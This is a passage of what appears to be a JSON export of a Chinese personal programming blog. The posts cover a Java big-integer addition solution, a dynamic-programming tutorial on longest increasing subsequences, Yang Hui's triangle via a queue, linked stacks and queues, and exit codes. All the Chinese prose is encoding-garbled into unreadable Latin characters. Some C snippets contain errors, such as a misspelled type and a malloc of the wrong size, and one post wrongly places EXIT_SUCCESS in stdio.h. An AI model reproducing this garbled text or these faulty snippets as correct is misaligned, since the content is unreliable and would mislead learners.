}åšäº†ï¼Œå¥½ä¹…ï¼Œæ˜¨å¤©æ™šä¸Š8.00é’Ÿå†™ï¼Œå†™åˆ°9.30ï¼Œåˆ®å¤§é£ï¼Œä¸‹é›¨äº†ï¼Œæˆ‘æ‰“ç€é›¨ä¼ï¼Œèµ°åœ¨é›¨ä¸­ã€‚æˆ‘ä»¬è¿™è¾¹ï¼Œæ—è¾¹çš„åŸå¸‚ï¼Œåˆ®èµ·äº†é¾™å·é£ï¼Œè¿˜ä¸‹äº†å†°é›¹ï¼Œæ­»äº†98äººï¼Œä¼¤æ˜¯500å¤šäººï¼Œå„å°”å°¼è¯ºç°è±¡ï¼Œå®¤å‹è¯´è¿™å’Œä¸ƒæœˆä¸‹é›ªï¼Œæ˜¯ä¸€æ ·çš„ï¼› ç„¶åï¼Œä»Šå¤©ä»ä¸Šåˆï¼Œ10.00å·¦å³ï¼Œå†™ï¼Œå†™äº†ä¸€éï¼Œç„¶åå‡ºé”™ï¼Œè°ƒäº†å¥½ä¹…ï¼Œä¸€ç›´æ˜¯é”™ï¼Œå¹²è„†ï¼Œå°±ç¡äº†ä¸€è§‰ï¼Œé‡æ–°å†™äº†ä¸€éï¼Œåƒé¥­å»java import java.util.Scanner; import java.math.BigInteger; public class Main { public static void main(String []args){ BigInteger a,b; int T; Scanner input=new Scanner(System.in); T=input.nextInt(); for(int i=1;i&lt;=T;i++){ a=input.nextBigInteger(); b=input.nextBigInteger(); System.out.println(&quot;Case&quot;+&quot; &quot;+i+&quot;:&quot;); System.out.println(a+&quot; + &quot;+b+&quot; = &quot;+a.add(b)); } } }","categories":[],"tags":[{"name":"ACM","slug":"ACM","permalink":"http://yoursite.com/tags/ACM/"}]},{"title":"å•è°ƒé€’å¢æœ€é•¿å­åºåˆ—-ç¬¬ä¸€ä¸ªdpï¼ˆåŠ¨æ€è§„åˆ’ï¼‰","slug":"å•è°ƒé€’å¢æœ€é•¿å­åºåˆ—-ç¬¬ä¸€ä¸ªdpï¼ˆåŠ¨æ€è§„åˆ’ï¼‰","date":"2016-06-21T03:37:55.000Z","updated":"2020-11-14T17:12:18.137Z","comments":true,"path":"2016/06/21/å•è°ƒé€’å¢æœ€é•¿å­åºåˆ—-ç¬¬ä¸€ä¸ªdpï¼ˆåŠ¨æ€è§„åˆ’ï¼‰/","link":"","permalink":"http://yoursite.com/2016/06/21/%E5%8D%95%E8%B0%83%E9%80%92%E5%A2%9E%E6%9C%80%E9%95%BF%E5%AD%90%E5%BA%8F%E5%88%97-%E7%AC%AC%E4%B8%80%E4%B8%AAdp%EF%BC%88%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%EF%BC%89/","excerpt":"","text":"ä¹Ÿè®¸ä½ å’Œæˆ‘ä¸€æ ·ï¼Œåˆšæ¥è§¦åŠ¨æ€è§„åˆ’ï¼Œä¸€å¤´é›¾æ°´ï¼Œçœ‹ä¹Ÿçœ‹ä¸æ‡‚ï¼Œä½†ä½œä¸ºè¿‡æ¥äººï¼Œå†™ä¸‹ä¸€ç‚¹ä¸œè¥¿ï¼Œä¸€æ–¹é¢ï¼Œå¢åŠ è‡ªå·±çš„è®°å¿†ï¼Œå¦ä¸€æ–¹é¢ï¼Œç»™ä½ ä»¬ç‚¹å¹²è´§ã€‚dpï¼ˆdynamicprogrammingï¼‰ï¼›1. åŠ¨æ€è§„åˆ’ï¼Œå°±æ˜¯æŠŠè®¡ç®—è¿‡ç¨‹ä¸­äº§ç”Ÿçš„ä¸­é—´ç»“æœé™æ€åœ°ä¿å­˜èµ·æ¥ï¼Œåé¢å†ç”¨åˆ°è¿™äº›ä¸­é—´ç»“æœçš„æ—¶å€™å°±ä¸ç”¨å†ç®—ä¸€éï¼Œè€Œæ˜¯ç›´æ¥è¯»å–ã€‚2. åŠ¨æ€è§„åˆ’æ˜¯é€’å½’ï¼Œæ˜¯ç¼“å­˜ï¼Œæ˜¯ ç”¨ç©ºé—´æ¥æ¢å–æ—¶é—´ ã€‚3. åŸé—®é¢˜çš„è§£å¦‚ä½•ç”±å­é—®é¢˜çš„è§£ç»„åˆè€Œæˆã€‚ **ä¸€ä¸ªæ­£å¸¸çš„æ€ç»´è¿‡ç¨‹åº”è¯¥æ˜¯ï¼š1.OK è¿™ä¸ªé—®é¢˜éœ€è¦ç”¨åˆ°é€’å½’çš„æ€æƒ³â€¦.2.å¼€å§‹å†™é€’å½’â€¦3.å“‡ ç®—å¯¹äº†..4. è¯¶ï¼Ÿæ€ä¹ˆæ„Ÿè§‰æœ‰å¾ˆå¤šsub problemè¢«é‡å¤è®¡ç®—äº† å¹² å¤æ‚åº¦åˆ°äº† 2^N5. å¥½å§ dpä¸€ä¸‹ å¼„ä¸ªtableæˆ–è€…æ˜¯treeæ¥memoizationä¸€ä¸‹â€¦6. ä¼˜åŒ–æˆåŠŸ(å½“ç„¶å¦‚æœä½ æç«èµ›ä»¥ä¸Šè¿‡ç¨‹ä¸é€‚åˆä½  å¦‚æœä½ åªæ˜¯çº¯ç²¹è§‰å¾—ç†è§£dpæ˜¯ä¸€ä»¶æœ‰è¶£çš„äº‹æƒ…æˆ–è€…å¯¹ç®—æ³•æŠ±æœ‰çº¯ç²¹çš„å…´è¶£ é‚£ä¹ˆæˆ‘è§‰å¾—ä»¥ä¸Šçš„è¿‡ç¨‹å¾ˆé€‚åˆä½ ) ä½œè€…ï¼šPusheen Cherishé“¾æ¥ï¼š http://www.zhihu.com/question/23995189/answer/36008790 æ¥æºï¼šçŸ¥ä¹è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚**å¦‚æœä½ ä»¬å…ˆè¯¦ç»†äº†è§£ï¼Œå…¥é—¨åŠ¨æ€è§„åˆ’ï¼Œé‚£å°±çœ‹çœ‹çŸ¥ä¹è¿™ä¸ªé¡µé¢ http://www.zhihu.com/question/23995189 ä¸‹é¢è´´ä»£ç  #include &lt;stdio.h&gt; #include &lt;string.h&gt; char a[10001]; int dp[10000]; int f(int len) { int i,j,ans,m;//ansæ˜¯è¿™ä¸ªå­—ç¬¦ä¸²ä¸­æœ€é•¿å­åºåˆ—çš„å€¼ dp[0]=1,ans=1;//å¦‚æœè¿™ä¸ªå­—ç¬¦ä¸²å­˜åœ¨ï¼Œé‚£å°±å­˜åœ¨dp[0],ans[1]; for(i=1;i&lt;len;i++)//éå†æ•°ç»„ { m=0;//å¦‚æœa[i]æ¯”å‰é¢çš„æ‰€æœ‰éƒ½å°ï¼Œdp[i]=1; for(j=0;j&lt;i;j++)//è·å¾—ä»i=0,åˆ°i=iä¹‹é—´a[i]å¯ä»¥è¿ç»­é€’å¢çš„å€¼ { if(dp[j]&gt;m&amp;&amp;a[j]&lt;a[i]) m=dp[j]; } dp[i]=m+1;//æ‰¾åˆ°é‚£ä¸ªiä¹‹å‰çš„æœ€å¤§å€¼,å¹¶åŠ 1 if(dp[i]&gt;ans)//ä¸æ–­è·å¾—æœ€å¤§å€¼ ans=dp[i]; } return ans; } int main() { int n,len; scanf(&quot;%d&quot;,&amp;n); while(n--) { scanf(&quot;%s&quot;,&amp;a); len=strlen(a); printf(&quot;%d\\n&quot;,f(len)); } return 0; }å¾ˆå¤šä¸œè¥¿ï¼Œéƒ½æ˜¯æ¥åŠ›ä¸‹å»çš„ï¼Œå†™åšå®¢ï¼Œå°±æ˜¯ä¸€ç§æ¥åŠ›ï¼Œdpä¹Ÿæ˜¯ä¸€ç§æ¥åŠ›ï¼Œåè¾ˆï¼Œå¥½å¥½åŠ æ²¹ï¼Œæˆ‘ä¹ŸåŠ æ²¹ é‡ç‚¹ç ”ç©¶å‡ ç±»ç»å…¸é—®é¢˜åœ¨ç†è§£äº†åŠ¨æ€è§„åˆ’çš„ä¸€äº›æ¦‚å¿µä¹‹åï¼Œè¦èƒ½åšåˆ°ç”¨åŠ¨æ€è§„åˆ’è§£é¢˜ï¼Œå…¶ä¸­é‡ç‚¹ç ”ç©¶å‡ ç±»ç»å…¸é—®é¢˜æ˜¯å¾ˆæœ‰å¿…è¦çš„ã€‚å°±è¿‘å‡ å¹´çš„æ¯”èµ›é¢˜ç›®è€Œè¨€ï¼Œå¾€å¾€éƒ½å¯ä»¥è½¬åŒ–ä¸ºæˆ‘ä»¬å·²çŸ¥çš„ç»å…¸æ¨¡å‹ã€‚ä¸‹é¢ä»‹ç»å‡ ä¸ªç»å…¸æ¨¡å‹ï¼š1ã€æŒ‰çŠ¶æ€ç±»å‹åˆ†ç¼–å·ï¼ˆé•¿åº¦ï¼‰åŠ¨æ€è§„åˆ’ç±»ï¼Œé¢˜åº“ï¼šæœ€é•¿ä¸ä¸‹é™å­åºåˆ—ï¼›æ‹¦æˆªå¯¼å¼¹ï¼ˆnoip99ï¼‰ï¼›èŠ±åº—æ©±çª—å¸ƒç½®ï¼ˆioi99ï¼‰ã€‚åŒºé—´åŠ¨æ€è§„åˆ’ç±»ï¼Œé¢˜åº“ï¼šçŸ³å­åˆå¹¶ï¼›é‚®å±€ï¼ˆioi2000ï¼‰ã€‚åæ ‡åŠ¨æ€è§„åˆ’ç±»ï¼Œé¢˜åº“ï¼šæ£‹ç›˜åˆ†å‰²ï¼ˆnoi99ï¼‰ã€‚æ•°è½´åŠ¨æ€è§„åˆ’ç±»ï¼Œé¢˜åº“ï¼š01èƒŒåŒ…ï¼›è£…ç®±é—®é¢˜ï¼ˆnoip01ï¼‰ã€‚æ ‘å‹åŠ¨æ€è§„åˆ’ç±»ï¼Œé¢˜åº“ï¼šé€‰è¯¾ï¼ˆctsc97ï¼‰ï¼Œè´ªé£Ÿçš„ä¹å¤´é¾™ï¼ˆnoi02ï¼‰ã€‚é›†åˆåŠ¨æ€è§„åˆ’ï¼ˆçŠ¶æ€å‹ç¼©ï¼‰ç±»ï¼Œé¢˜åº“ï¼šè´­ç‰©ï¼ˆioi95ï¼‰ã€‚2ã€æŒ‰è½¬ç§»æ–¹å¼åˆ†å­˜åœ¨æ€§ï¼š01ç»Ÿè®¡ï¼ˆctsc99ï¼‰ï¼›Catalanæ•°åˆ’åˆ†é—®é¢˜ï¼šåˆ†å‰²ç‚¹æœ‰åºç±»ï¼Œé¢˜åº“ï¼šæˆç»©æœ€å¤§ï¼ˆnoip00ï¼‰åˆ†å‰²ç‚¹æ— åºç±»ï¼Œé¢˜åº“ï¼šçŸ³å­åˆå¹¶ï¼ˆnoi95ï¼‰ï¼›åŠ åˆ†äºŒå‰æ ‘ï¼ˆnoip03ï¼‰ï¼›æ‹¬å·åºåˆ—3ã€è·¯å¾„é—®é¢˜ï¼šæ–¹æ ¼å–æ•°ï¼ˆnoip00ï¼‰ï¼›èŠ±åº—æ©±çª—å¸ƒç½®ï¼ˆioi99ï¼‰é€šè¿‡è¿™äº›ç»å…¸æ¨¡å‹çš„ç ”ç©¶ï¼Œå¯ä»¥ä»å¤šè§’åº¦äº†è§£å¦‚ä½•è¿›è¡ŒçŠ¶æ€çš„åˆ’åˆ†ï¼Œç„¶ååå¤ç†è§£æ¯ä¸€ä¸ªè½¬ç§»æ–¹ç¨‹çš„æ„ä¹‰ï¼Œåœ¨æ½œç§»é»˜åŒ–ä¹‹ä¸­ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥è¾¾åˆ°åŠ¨æ€è§„åˆ’çš„åŸºæœ¬è¦æ±‚ï¼Œåšåˆ°ä»¥ä¸å˜åº”ä¸‡å˜ã€‚","categories":[],"tags":[{"name":"åŠ¨æ€è§„åˆ’","slug":"åŠ¨æ€è§„åˆ’","permalink":"http://yoursite.com/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"é€’å½’","slug":"é€’å½’","permalink":"http://yoursite.com/tags/%E9%80%92%E5%BD%92/"},{"name":"dp","slug":"dp","permalink":"http://yoursite.com/tags/dp/"}]},{"title":"æ¨è¾‰ä¸‰è§’é˜Ÿåˆ—æ–¹å¼","slug":"æ¨è¾‰ä¸‰è§’é˜Ÿåˆ—æ–¹å¼","date":"2016-06-14T11:34:25.000Z","updated":"2020-11-14T17:12:18.665Z","comments":true,"path":"2016/06/14/æ¨è¾‰ä¸‰è§’é˜Ÿåˆ—æ–¹å¼/","link":"","permalink":"http://yoursite.com/2016/06/14/%E6%9D%A8%E8%BE%89%E4%B8%89%E8%A7%92%E9%98%9F%E5%88%97%E6%96%B9%E5%BC%8F/","excerpt":"","text":"void YanghuiTriangle(int N) { int i,n,x,temp; linkqueue q; initqueue(&amp;q); enterqueue(&amp;q,1);//ç¬¬ä¸€è¡Œå…¥é˜Ÿ for(n=2;n&lt;=N;n++)//ç”±ç¬¬iè¡Œè½¬æ¢ä¸ºi-1è¡Œ { enterqueue(&amp;q,1);//ç¬¬nè¡Œç¬¬ä¸€ä¸ªå…ƒç´ å…¥é˜Ÿ for(i=1;i&lt;=n-2;i++)/*å°†n-1è¡Œï¼Œæœ‰n-1ä¸ªå…ƒç´ */ { deletequeue(&amp;q,&amp;temp);//åˆ é™¤å½“å‰é˜Ÿåˆ—ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆ1ï¼‰ printf(&quot;%d\\t&quot;,temp);/*ä»ç¬¬1ä¸ªæ•°åˆ°ç¬¬n-2ä¸ªæ•°è¾“å‡º*/ gettop(q,&amp;x); temp+=x;//è·å¾—å½“å‰é˜Ÿåˆ—ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ å€¼ï¼Œå¹¶å°†å…¶ç›¸åŠ ï¼ˆ2ï¼‰ //ï¼ˆ1ï¼‰ï¼ˆ2ï¼‰å¹¶ä¸ç›¸åŒ enterqueue(&amp;q,temp);//åˆ†åˆ«å°†nè¡Œçš„ï¼Œä»ç¬¬äºŒä¸ªæ•°åˆ°ç¬¬n-1ä¸ª //æ•°å…¥é˜Ÿåˆ— } deletequeue(&amp;q,&amp;x);//å°†n-1è¡Œçš„ï¼Œæœ€åä¸€ä¸ªæ•°ï¼Œåˆ é™¤ï¼Œå¹¶è¾“å‡º printf(&quot;%d\\t&quot;,x); enterqueue(&amp;q,1);//å°†ç¬¬nè¡Œçš„ï¼Œæœ€åä¸€ä¸ªæ•°ï¼Œè¿›å…¥é˜Ÿåˆ—ä¸­ printf(&quot;\\n&quot;); } }è®²äº†å¾ˆå¤šï¼Œå°†é˜Ÿåˆ—çš„å…ƒç´ çš„è®°å½•å†™ä¸‹æ¥å†™å‡ ä¸ª===ã€‹ï¼ˆé˜Ÿå¤´æ–¹å‘ï¼‰1 3 3 1 1 2 1 1 1 1â€”â‘£â€”â€”â‘¢â€”â‘¡-â‘  åƒé¥­å»äº†","categories":[],"tags":[{"name":"é˜Ÿåˆ—","slug":"é˜Ÿåˆ—","permalink":"http://yoursite.com/tags/%E9%98%9F%E5%88%97/"},{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"å‹é“¾æ ˆä¸è¿›é“¾é˜Ÿåˆ—å’Œåˆ›å»ºçº¿æ€§è¡¨çš„å…³ç³»","slug":"å‹é“¾æ ˆä¸è¿›é“¾é˜Ÿåˆ—å’Œåˆ›å»ºçº¿æ€§è¡¨çš„å…³ç³»","date":"2016-06-12T00:56:17.000Z","updated":"2020-11-14T17:12:19.147Z","comments":true,"path":"2016/06/12/å‹é“¾æ ˆä¸è¿›é“¾é˜Ÿåˆ—å’Œåˆ›å»ºçº¿æ€§è¡¨çš„å…³ç³»/","link":"","permalink":"http://yoursite.com/2016/06/12/%E5%8E%8B%E9%93%BE%E6%A0%88%E4%B8%8E%E8%BF%9B%E9%93%BE%E9%98%9F%E5%88%97%E5%92%8C%E5%88%9B%E5%BB%BA%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%9A%84%E5%85%B3%E7%B3%BB/","excerpt":"","text":"é¦–å…ˆï¼Œæ¥å†™ä¸‹1.çº¿æ€§è¡¨çš„å¤´æ’æ³• void CreateFromHead(linklist *h) { lisklist *s; char c; c=getchar(); while(c!=&apos;$&apos;) { s=(linklist *)malloc(sizeof(linklist)); s-&gt;data=c; s-&gt;next=h-&gt;next; h-&gt;next=s; c=getchar(); } }è¿›æ ˆçš„ä»£ç  int push(LinkStack *top,StackElemType x) { LinkStack *new; new=(LinkStack)malloc(sizeof(LinkStack)); if(new==NULL)return FALSE; new-&gt;data=x; new-&gt;next=top-&gt;next; top-&gt;next=new; return OK; }2.çº¿æ€§è¡¨çš„å°¾æ’æ³• void CreateFromTail(LinkList *h) { LinkList *tail,*new; tail=h; char c=getchar(); while(c!=&apos;$&apos;) { new=(linklist *)malloc(sizeof(linklist)); new-&gt;data=c; tail-&gt;next=new; tail=new; c=getchar(); } tail-&gt;next=NULL; }é“¾é˜Ÿåˆ—çš„å…¥é˜Ÿ int EnterQueue(LinkQueue *q,QueueElemType x){ LinkQueueNode *newnode; newnode=(LinkQueue*)malloc(sizeof(LinkQueue)); if(newnode==NULL) return FALSE; newnode-&gt;data=x; newnode-&gt;next=NULL; q-&gt;rear-&gt;next=newnode; q-&gt;rear=newnode; return OK; }æ ˆä¸é˜Ÿåˆ—çš„å‡ºç°æˆ–è€…è¯´æ˜¯å¿…ç„¶ï¼Œä¹Ÿæ˜¯å¶ç„¶","categories":[],"tags":[{"name":"cè¯­è¨€","slug":"cè¯­è¨€","permalink":"http://yoursite.com/tags/c%E8%AF%AD%E8%A8%80/"},{"name":"çº¿æ€§è¡¨","slug":"çº¿æ€§è¡¨","permalink":"http://yoursite.com/tags/%E7%BA%BF%E6%80%A7%E8%A1%A8/"},{"name":"æ ˆ","slug":"æ ˆ","permalink":"http://yoursite.com/tags/%E6%A0%88/"},{"name":"é˜Ÿåˆ—","slug":"é˜Ÿåˆ—","permalink":"http://yoursite.com/tags/%E9%98%9F%E5%88%97/"}]},{"title":"exit(0),exit(1),exit(-1)çš„åŒºåˆ«","slug":"exit(0),exit(1),exit(-1)çš„åŒºåˆ«","date":"2016-05-09T12:25:36.000Z","updated":"2020-11-14T17:12:19.612Z","comments":true,"path":"2016/05/09/exit(0),exit(1),exit(-1)çš„åŒºåˆ«/","link":"","permalink":"http://yoursite.com/2016/05/09/exit(0),exit(1),exit(-1)%E7%9A%84%E5%8C%BA%E5%88%AB/","excerpt":"","text":"exit(0)æ­£å¸¸exit(1)å’Œexit(-1)ä¸æ­£å¸¸1å’Œ-1ä¸ªäººä¹ æƒ¯ EXIT_SUCCESSè¡¨ç¤ºæ­£å¸¸ï¼ŒEXIT_FAILUREè¡¨ç¤ºå¤±è´¥ï¼Œå®šä¹‰åœ¨stdio.hé‡Œã€‚","categories":[],"tags":[{"name":"c++","slug":"c","permalink":"http://yoursite.com/tags/c/"}]}]}